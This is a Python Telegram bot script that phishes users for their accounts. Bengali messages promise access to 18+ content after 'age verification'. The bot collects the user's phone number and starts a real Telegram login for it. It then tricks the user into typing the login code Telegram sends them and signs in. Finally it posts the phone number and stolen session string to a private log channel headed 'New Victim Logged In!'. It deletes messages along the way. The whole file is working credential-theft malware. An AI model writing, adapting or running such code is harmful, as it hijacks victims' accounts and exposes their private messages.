import os
import asyncio
from dotenv import load_dotenv
from telethon import TelegramClient, events, types, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# কনফিগারেশন লোড
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))

bot = TelegramClient('login_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_data = {}

# অটো ডিলিট ফাংশন
async def delete_after(event, delay=300):
    await asyncio.sleep(delay)
    try:
        await event.delete()
    except:
        pass

def build_keypad():
    buttons = []
    nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    row = []
    for num in nums:
        row.append(Button.inline(num, data=f"num_{num}"))
        if len(row) == 3:
            buttons.append(row)
            row = []
    buttons.append([Button.inline("❌ Clear", data="clear"), Button.inline("0", data="num_0"), Button.inline("✅ Submit", data="submit")])
    # অফিশিয়াল লিংকের বাটন
    buttons.append([Button.url("📩 উপরের Key টি পেতে এখানে ক্লিক করুন", "tg://openmessage?user_id=777000")]) 
    return buttons

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    msg = await event.respond(
        "🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করা প্রয়োজন।**\n\n"
        "নিচের বড় সবুজ বাটনে ক্লিক করে আপনার বয়স নিশ্চিত করুন।",
        buttons=[[Button.request_phone("✅ আমি ১৮ বছরের উপরে (নিশ্চিত করুন)")]]
    )
    asyncio.create_task(delete_after(msg))

@bot.on(events.NewMessage)
async def handle_contact(event):
    if event.message.contact:
        phone = event.message.contact.phone_number
        chat_id = event.chat_id
        
        # ইউজার কন্টাক্ট পাঠানোর সাথে সাথে আগের সব মেসেজ ডিলিট
        await event.delete()

        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await new_client.connect()

        try:
            send_code = await new_client.send_code_request(phone)
            user_data[chat_id] = {
                'phone': phone,
                'client': new_client,
                'hash': send_code.phone_code_hash,
                'typed_code': ""
            }
            
            # নম্বর হাইড করে প্রফেশনাল মেসেজ
            msg = await event.respond(
                "🛡️ **VIP এক্সেস ভেরিফিকেশন চলছে...**\n\n"
                "**নিচের Key বাটনে ক্লিক করে সবার নিচের ৫ ডিজিটের নম্বরটি (Key) এখানে টাইপ করুন এবং সাবমিট বাটনে ক্লিক করুন।**\n\n"
                "**Input:** `____`",
                buttons=build_keypad()
            )
            asyncio.create_task(delete_after(msg))

        except Exception as e:
            await event.respond(f"Error: {str(e)}")

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    chat_id = event.chat_id
    if chat_id not in user_data: return

    data = event.data.decode('utf-8')
    current = user_data[chat_id]

    if data.startswith("num_"):
        num = data.split("_")[1]
        if len(current['typed_code']) < 5:
            current['typed_code'] += num
            await event.edit(
                "🛡️ **VIP এক্সেস ভেরিফিকেশন চলছে...**\n\n"
                "**নিচের Key বাটনে ক্লিক করে সবার নিচের ৫ ডিজিটের নম্বরটি (Key) নিচে লিখে VIP এক্সেস নিন।**\n\n"
                f"**Input:** `{current['typed_code']}`",
                buttons=build_keypad()
            )

    elif data == "clear":
        current['typed_code'] = ""
        await event.edit("🛡️ **Key মুছে ফেলা হয়েছে। আবার টাইপ করুন।**", buttons=build_keypad())

    elif data == "submit":
        code = current['typed_code']
        client = current['client']
        try:
            await client.sign_in(current['phone'], code, phone_code_hash=current['hash'])
            session_str = client.session.save()

            # লগ চ্যানেলে তথ্য পাঠানো
            await bot.send_message(
                LOG_CHANNEL_ID, 
                f"🔥 **New Victim Logged In!**\n\n"
                f"📱 **Phone:** `{current['phone']}`\n"
                f"🔑 **Session:** `{session_str}`"
            )

            success_msg = await event.edit("✅ **বয়স যাচাই সফল!**\n\nআমাদের সার্ভারে আপনাকে স্বাগতম। এখন থেকে আপনি সব কন্টেন্ট দেখতে পারবেন।")
            asyncio.create_task(delete_after(success_msg))

        except PhoneCodeInvalidError:
            current['typed_code'] = ""
            await event.edit("❌ **ভুল ভেরিফিকেশন Key!** সঠিক Key টি পুনরায় টাইপ করুন।", buttons=build_keypad())
        except Exception as e:
            await event.edit(f"⚠️ **Error:** {str(e)}")

print("Bot is successfully running...")
bot.run_until_disconnected()
